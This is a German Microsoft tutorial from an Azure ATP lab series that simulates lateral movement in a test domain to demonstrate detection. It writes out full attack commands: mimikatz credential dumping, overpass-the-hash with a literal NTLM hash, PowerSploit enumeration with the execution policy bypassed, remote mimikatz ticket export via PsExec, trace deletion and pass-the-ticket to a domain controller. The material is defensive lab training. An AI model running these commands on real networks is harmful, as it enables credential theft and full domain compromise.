---
title: Playbook zu Lateral Movement-Sicherheitswarnungen in Azure ATP
description: Das Azure ATP-Playbook beschreibt, wie Sie Lateral Movement-Bedrohungen für die Erkennung durch Azure ATP simulieren können.
ms.service: azure-advanced-threat-protection
ms.topic: tutorial
author: shsagir
ms.author: shsagir
ms.date: 03/03/2019
ms.reviewer: itargoet
ms.openlocfilehash: 998b932dc88ca14bed4fd008ea5d1d6574e385a0
ms.sourcegitcommit: 11fff9d4ebf1c50b04f7789a22c80cdbc3e4416a
ms.translationtype: HT
ms.contentlocale: de-DE
ms.lasthandoff: 03/15/2020
ms.locfileid: "79410688"
---
# <a name="tutorial-lateral-movement-playbook"></a>Tutorial: Lateral Movement-Playbook

Das Lateral Movement-Playbook ist das dritte Tutorial der vierteiligen Reihe zu Azure ATP-Sicherheitswarnungen. Die Azure ATP-Sicherheitswarnungsumgebung soll die Funktionen von **Azure ATP** zum Identifizieren und Erkennen verdächtiger Aktivitäten und potenzieller Angriffe auf Ihr Netzwerk veranschaulichen. Das Playbook erläutert, wie Sie *diskrete* Erkennungen durch Azure ATP testen. Dieses Playbook konzentriert sich auf *signaturbasierte* Funktionen von Azure ATP und enthält keine Warnungen oder Verhaltenserkennungen auf Basis des erweiterten Machine Learning, auf Benutzer- oder Entitätsbasis, da sie eine Lernphase mit echtem Netzwerkverkehr von bis zu 30 Tagen erfordern. Weitere Informationen über jedes Tutorial dieser Reihe finden Sie unter [Tutorialübersicht: ATP-Sicherheitswarnungsumgebung](atp-playbook-lab-overview.md).

Dieses Playbook stellt einige der Dienste für Bedrohungserkennungen und Sicherheitswarnungen von Azure ATP zum Lateral Movement-Pfad mithilfe nachgestellter Angriffe durch allgemeine, reale, öffentlich verfügbare Hacker- und Angriffstools vor.

Inhalt des Tutorials:
> [!div class="checklist"]
> * Sammeln von NTLM-Hashes und Simulieren eines Overpass-the-Hash-Angriffs, um ein Kerberos Ticket-erteilendes Ticket (TGT) zu erhalten.
> * Ausgeben als ein anderer Benutzer und seitliches Bewegen durch das Netzwerk, um weitere Anmeldeinformationen zu sammeln.
> * Simulieren eines Pass-the-Ticket-Angriff, um Zugriff auf den Domänencontroller zu erhalten.
> * Überprüfen der Sicherheitswarnungen aus der seitlichen Bewegung in Azure ATP.

## <a name="prerequisites"></a>Voraussetzungen

1. [Eine vollständige ATP-Sicherheitswarnungsumgebung](atp-playbook-setup-lab.md) 
     - Sie sollten die Setupanweisungen für die Testumgebung genau einhalten. Je mehr Ihre Testumgebung dem vorgeschlagenen Testumgebungssetup entspricht, desto einfacher können Sie die Azure ATP-Testverfahren befolgen.

2. [Abschluss des Tutorials zum Playbook zu Reconnaissance](atp-playbook-reconnaissance.md)

## <a name="lateral-movement"></a>Seitliche Verschiebung

Aus unseren simulierten Angriffen im vorherigen Tutorial, dem Playbook zu Reconnaissance, haben wir umfangreiche Netzwerkinformationen gewonnen. Mit diesen Informationen ist es unser Ziel, während dieser Phase der seitlichen Bewegung der Testumgebung an die bereits entdeckten kritischen IP-Adressen heranzukommen und die Warnungen von Azure ATP über die Bewegung anzuzeigen. In der vorherigen Simulation der Reconnaissance-Testumgebung haben wir 10.0.24.6 als Ziel-IP identifiziert, da dort die Computer-Anmeldeinformationen von SamiraA verfügbar sind. Wir werden verschiedene Angriffsmethoden nachahmen, um zu versuchen, uns seitlich durch die Domäne zu bewegen.

## <a name="dump-credentials-in-memory-from-victimpc"></a>Sichern von Anmeldeinformationen im Speicher von VictimPC

Während unserer simulierten Reconnaissance-Angriffe wurde **VictimPC** nicht nur für die Anmeldeinformationen von JeffL verfügbar. Es gibt noch andere nützliche Konten auf diesem Computer zu entdecken. Um eine seitliche Bewegung mit **VictimPC** zu erzielen, werden wir versuchen, die Anmeldedaten im Speicher der freigegebenen Ressource zu enumerieren. Das Sichern von speicherinternen Anmeldeinformationen mit **mimikatz** ist eine beliebte Angriffsmethode mit einem gängigen Tool.

### <a name="mimikatz-sekurlsalogonpasswords"></a>Mimikatz sekurlsa::logonpasswords

1. Öffnen Sie eine **Eingabeaufforderung mit erhöhten Rechten** auf **VictimPC**. 
2. Navigieren Sie zu dem Ordner „Tools“, in dem Sie Mimikatz gespeichert haben, und führen Sie den folgenden Befehl aus:

   ``` cmd
   mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
   ```

3. Öffnen Sie **c:\\temp\\victimpc.txt**, um die von Mimikatz gesammelten und in die txt-Datei geschrieben Anmeldeinformationen anzuzeigen.
   ![Mimikatz-Ausgabe einschließlich RonHDs NTLM-Hash](media/playbook-lateral-sekurlsa-logonpasswords-output.png).

4. Wir haben RonHDs NTLM-Hash mit Hilfe von Mimikatz erfolgreich aus dem Speicher geholt. Wir benötigen den NTLM-Hash in Kürze.

   > [!Important]
   > - Es ist zu erwarten und normal, dass sich die in diesem Beispiel gezeigten Hashes von den Hashes unterscheiden, die Sie in Ihrer eigenen Testumgebung sehen. Der Zweck dieser Übung ist es, zu verstehen, wie die Hashes gewonnen wurden, wie ihre Werte abgerufen werden und wie sie in den nächsten Phasen eingesetzt werden. </br> </br>
   > - Die Anmeldeinformationen des Computerkontos wurde ebenfalls erfasst. Auch wenn die Anmeldeinformationen des Computerkontos in unserer aktuellen Testumgebung nicht hilfreich sind, denken Sie daran, dass dies ein weiterer Weg ist, den echte Angreifer nutzen, um seitliche Bewegung in Ihrer Umgebung zu umzusetzen.

### <a name="gather-more-information-about-the-ronhd-account"></a>Sammeln von weiteren Informationen über das RonHD-Konto

Ein Angreifer weiß möglicherweise zunächst nicht, wer RonHD ist oder wie hoch sein Wert als Ziel ist. Alles, was sie wissen, ist, dass sie die Anmeldeinformationen verwenden können, wenn dies vorteilhaft ist. Mit dem Befehl **net** können wir jedoch als Angreifer herausfinden, in welchen Gruppen RonHD Mitglied ist.

Führen Sie auf **VictimPC** den folgenden Befehl aus:

   ``` cmd
   net user ronhd /domain
   ```

![Reconnaissance mit dem RonHD-Konto](media/playbook-lateral-sekurlsa-logonpasswords-ronhd_discovery.png)

Aus den Ergebnissen geht hervor, dass RonHD ist Mitglied der Sicherheitsgruppe „Helpdesk“ ist. Wir wissen, dass wir durch RonHD Berechtigungen erhalten, die mit dem Konto *und* der Sicherheitsgruppe „Helpdesk“ verbunden sind.

### <a name="mimikatz-sekurlsapth"></a>Mimikatz sekurlsa::pth

Unter Verwendung einer gebräuchlichen Methode namens **Overpass-the-Hash** wird der gesammelte NTLM-Hash verwendet, um ein TGT zu erhalten. Ein Angreifer mit dem TGT eines Benutzers kann sich als kompromittierter Benutzer wie RonHD ausgeben. Während wir uns als RonHD ausgeben, können wir auf jede Domänenressource zugreifen, auf die der betroffene Benutzer Zugriff hat oder auf die seine jeweiligen Sicherheitsgruppen Zugriff haben.

1. Wechseln Sie von **VictimPC** in das Verzeichnis mit dem Ordner **Mimikatz.exe**. in Ihrem Dateisystem, und führen Sie den folgenden Befehl aus:

   ``` cmd
   mimikatz.exe "privilege::debug" "sekurlsa::pth /user:ronhd /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:contoso.azure" "exit"
   ```

   > [!Note]
   > Wenn Ihr Hash für RonHD in den vorherigen Schritten nicht identisch war, ersetzen Sie den obigen NTLM-Hash durch den Hash, den Sie aus *victimpc.txt* gesammelt haben.

   ![Overpass-the-Hash über Mimikatz](media/playbook-lateral-opth1.png)

2. Überprüfen Sie, ob eine neue Eingabeaufforderung geöffnet wird. Es wird als RonHD ausgeführt, aber das ist vielleicht *noch* nicht ersichtlich. Schließen Sie die neue Eingabeaufforderung nicht, da Sie sie als nächstes verwenden werden.

Azure ATP erkennt keinen Hash, der auf eine lokale Ressource übertragen wird. Azure ATP erkennt, wenn ein Hash von **einer Ressource verwendet wird, um auf eine andere** Ressource oder einen Dienst zuzugreifen.

### <a name="additional-lateral-move"></a>Zusätzliche seitliche Bewegung

Haben wir jetzt mit den Anmeldeinformationen von RonHD Zugriffsmöglichkeiten, die wir bisher mit den Anmeldeinformationen von JeffL nicht hatten?
Wir verwenden **PowerSploit** ```Get-NetLocalGroup```, um diese Frage zu beantworten.

1. Führen Sie in der Befehlskonsole, die sich aufgrund unseres vorherigen Angriffs geöffnet hat und als RonHD ausgeführt wird, die folgenden Elemente aus:

   ``` PowerShell
   powershell
   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
   Import-Module C:\tools\PowerSploit\PowerSploit.psm1 -Force
   Get-NetLocalGroup 10.0.24.6
   ```

   ![Lokale Administratoren für 10.0.24.6 über PowerSploit abrufen](media/playbook-lateral-adminpcsamr.png)

   Im Hintergrund identifiziert Remote SAM die lokalen Administratoren für die IP, die wir zuvor identifiziert haben und die in einem Domänenadministrator-Konto verfügbar war.

   Die Ausgabe sieht etwa wie folgt:

   ![Ausgabe der PowerSploit Get-NetLocalGroup](media/playbook-lateral-adminpcsamr_results.png)

   Dieses System verfügt über zwei lokale Administratoren, den integrierten Administrator „ContosoAdmin“ und „Helpdesk“. Wir wissen, dass RonHD Mitglied der Sicherheitsgruppe „Helpdesk“ ist. Wir kennen auch den Namen des Computers, AdminPC. Da wir die Anmeldeinformationen von RonHD haben, sollten wir sie verwenden können, um seitlich auf den AdminPC zu wechseln und Zugriff auf diesen Computer zu erhalten.

2. Geben Sie in der *gleichen Eingabeaufforderung , die im Kontext von RonHD* ausgeführt wird, **exit** ein, um PowerShell bei Bedarf zu verlassen. Führen Sie dann den folgenden Befehl aus:

   ``` cmd
   dir \\adminpc\c$
   ```

3. Der Zugriff auf AdminPC war erfolgreich. Schauen wir uns an, welche Tickets wir haben. Führen Sie an derselben Eingabeaufforderung den folgenden Befehl aus:

   ``` cmd
   klist
   ```

   ![Verwenden von „klist“, um Kerberos-Tickets in unserem aktuellen cmd.exe-Prozess anzuzeigen](media/playbook-lateral-klist.png)

Sie sehen, dass er Speicher in diesem bestimmten Prozess ein TGT von RonHD enthält. Wir haben erfolgreich einen Overpass-the-Hash-Angriff in unserer Testumgebung durchgeführt. Wir haben den zuvor kompromittierten NTLM-Hash konvertiert und damit einen Kerberos-TGT erhalten. Dieses Kerberos-TGT wurde dann verwendet, um Zugriff auf eine andere Netzwerkressource zu erhalten, in diesem Fall AdminPC. 

### <a name="overpass-the-hash-detected-in-azure-atp"></a>Overpass-the-Hash in Azure ATP erkannt

In der Azure ATP-Konsole sehen wir Folgendes:

![AATP bei der Erkennung des Overpass-the-Hash-Angriffs](media/playbook-lateral-opthdetection.png)

Azure ATP hat erkannt, dass RonHDs Konto bei VictimPC kompromittiert wurde und dann verwendet wurde, um erfolgreich einen Kerberos-TGT zu erhalten. Wenn wir in der Benachrichtigung auf den Namen von RonHD klicken, werden wir zur Logical Activity-Zeitachse von RonHD weitergeleitet, wo wir unsere Untersuchung fortsetzen können.

![Anzeige der Erkennung in der Logical Activity-Zeitachse](media/playbook-lateral-opthlogicalactivity.png)

Im Security Operations Center wird unser Security Analyst auf die gefährdeten Berechtigungen aufmerksam gemacht und kann schnell feststellen, auf welche Ressourcen zugegriffen wurde.

## <a name="domain-escalation"></a>Domänenausweitung

Von unserem simulierten Angriff aus haben wir nicht nur Zugriff auf AdminPC, wir haben auch Administratorrechte auf AdminPC validiert. Wir können nun seitlich auf AdminPC wechseln und weitere Anmeldeinformationen sammeln.

Hier werden wir:

* Mimikatz auf AdminPC bereistellen
* Tickets auf AdminPC sammeln
* Pass-the-Ticket an SamiraA

### <a name="pass-the-ticket"></a>Pass-the-Ticket

Wechseln Sie über die Eingabeaufforderung, die im Kontext von *RonHD* auf **VictimPC** ausgeführt wird, zu dem Ort, an dem sich unsere allgemeinen Angriffstools befinden. Führen Sie dann xcopy aus, um diese Tools auf den AdminPC zu verschieben:

``` cmd
xcopy mimikatz.exe \\adminpc\c$\temp
```

Drücken Sie bei Aufforderung ```d``` und geben Sie an, dass der Ordner „temp“ ein Verzeichnis auf dem AdminPC ist.

![Kopieren von Dateien zu AdminPC](media/playbook-escalation-xcopy1.png)

### <a name="mimikatz-sekurlsatickets"></a>Mimikatz sekurlsa::tickets

Da Mimikatz auf AdminPC bereitgestellt wurde, werden wir PsExec verwenden, um es remote auszuführen.

1. Wechseln Sie zum Speicherort von PsExec, und führen Sie den folgenden Befehl aus:

   ``` cmd
   PsExec.exe \\AdminPC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
   ```

   Dieser Befehl führt die im Prozess LSASS.exe gefundenen Tickets aus und exportiert sie in das aktuelle Verzeichnis auf dem AdminPC.

2. Wir müssen die Tickets von AdminPC zurück zu VictimPC kopieren. Da wir für dieses Beispiel nur an SamiraA's Tickets interessiert sind, führen Sie den folgenden Befehl aus:

   ``` cmd
   xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
   ```

   ![Export der gesammelten Anmeldeinformationen von AdminPC zurück zu VictimPC](media/playbook-escalation-export_tickets2.png)

3. Lassen Sie uns unsere Spuren auf dem AdminPC beseitigen, indem wir unsere Dateien löschen.

   ``` cmd
   rmdir \\adminpc\c$\temp /s /q
   ```

   > [!Note]
   > Erfahrenere Angreifer werden den Datenträger nicht berühren, wenn sie beliebigen Code auf einem Computer ausführen, nachdem sie Administratorrechte auf ihm erhalten haben.

   Auf **VictimPC** haben wir diese gesammelten Tickets im Ordner **c:\temp\adminpc_tickets**:

   ![C:\temp\tickets ist unsere exportierte Mimikatz-Ausgabe aus AdminPC](media/playbook-escalation-export_tickets4.png)


### <a name="mimikatz-kerberosptt"></a>Mimikatz Kerberos::ptt

Die Tickets befinden sich jetzt lokal auf VictimPC. Nun ist es an der Zeit, durch „Pass-the-Ticket“ zu SamiraA zu werden.

1. Öffnen Sie vom Speicherort von **Mimikatz** auf dem Dateisystem von **VictimPC** aus eine neue **Eingabeaufforderung mit erhöhten Rechten**, und führen Sie den folgenden Befehl aus:

   ``` cmd
   mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
   ```

   ![Importieren der den gestohlenen Tickets in den cmd.exe-Prozess](media/playbook-escalation-ptt1.png)

2. Überprüfen Sie in derselben Eingabeaufforderung mit erhöhten Rechten, ob sich die richtigen Tickets in der Eingabeaufforderungssitzung befinden. Führen Sie den folgenden Befehl aus:

   ``` cmd
   klist
   ```

   ![Ausführen von „klist“, um die importierten Tickets im CMD-Prozess anzuzeigen](media/playbook-escalation-ptt2.png)

3. Beachten Sie, dass diese Tickets ungenutzt bleiben. Wir haben als Angreifer fungiert und das Ticket erfolgreich übergeben. Wir haben die Anmeldeinformationen von SamirA von AdminPC gesammelt und sie dann an einen anderen Prozess weitergegeben, der auf VictimPC ausgeführt wird.

   > [!Note]
   > Wie in Pass-the-Hash weiß Azure ATP nicht, dass das Ticket aufgrund der lokalen Clientaktivität weitergegeben wurde. Azure ATP erkennt jedoch die Aktivität, *wenn das Ticket verwendet wird*, d.h. wenn es für den Zugriff auf eine andere Ressource/Dienst genutzt wird.

4. Schließen Sie Ihren simulierten Angriff ab, indem Sie von **VictimPC** aus auf den Domänencontroller zugreifen. Führen Sie in der Eingabeaufforderung, die jetzt mit den Tickets von SamirA im Speicher ausgeführt wird, folgenden Befehl aus:

   ``` cmd
   dir \\ContosoDC\c$
   ```

   ![Zugriff auf das Laufwerk c:\ von ContosoDC mit den Anmeldeinformationen von SamirA](media/playbook-escalation-ptt3.png)

Erfolg! Durch unsere Scheinangriffe erhielten wir Administratorzugriff auf unseren Domänencontroller und konnten die Active Directory-Domäne/-Gesamtstruktur unseres Testumgebung kompromittieren.

### <a name="pass-the-ticket-detection-in-azure-atp"></a>Pass-the-Ticket-Erkennung in Azure ATP

Die meisten Sicherheitstools haben keine Möglichkeit zu erkennen, wann eine legitime Berechtigung für den Zugriff auf eine legitime Ressource verwendet wurde. Im Gegensatz dazu, was erkennt Azure ATP in dieser Kette von Ereignissen und warnt dann davor?

- Azure ATP erkannte den Diebstahl von Samira's Tickets von AdminPC und die Bewegung zu VictimPC.
- Das Azure ATP-Portal zeigt außerdem genau an, auf welche Ressourcen mit den gestohlenen Tickets zugegriffen wurde.
- Sie erhalten wichtige Informationen, um genau festzustellen, wo Sie mit Ihrer Untersuchung beginnen und welche Abhilfemaßnahmen zu ergreifen sind.

Azure ATP-Erkennungen und Warnmeldungen sind für jedes Digital Forensics Incident Response (DFIR)-Team von entscheidender Bedeutung. Sie können nicht nur die gestohlenen Anmeldeinformationen sehen, sondern auch feststellen, welche Ressourcen das gestohlene Ticket für den Zugriff und die Kompromittierung verwendet hat.

![Azure ATP erkennt Pass-the-Ticket mit zweistündiger Unterdrückung](media/playbook-escalation-pttdetection.png)

> [!NOTE]
> Dieses Ereignis wird nur auf der Azure ATP-Konsole in **2 Stunden** angezeigt. Ereignisse dieser Art werden für diesen Zeitraum gezielt unterdrückt, um Fehlalarme zu reduzieren.

## <a name="next-steps"></a>Nächste Schritte
Der nächste Schritt in der Kette der Angriffsabwehr ist Domänendominanz.

> [!div class="nextstepaction"]
> [Azure ATP-Playbook zu Domänendominanz](atp-playbook-domain-dominance.md)

## <a name="join-the-community"></a>Beitritt zur Community

Haben Sie weitere Fragen, oder möchten Sie mit anderen über Azure ATP und damit verbundene Sicherheitsaspekte diskutieren? Treten Sie noch heute der [Azure ATP-Community](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) bei!
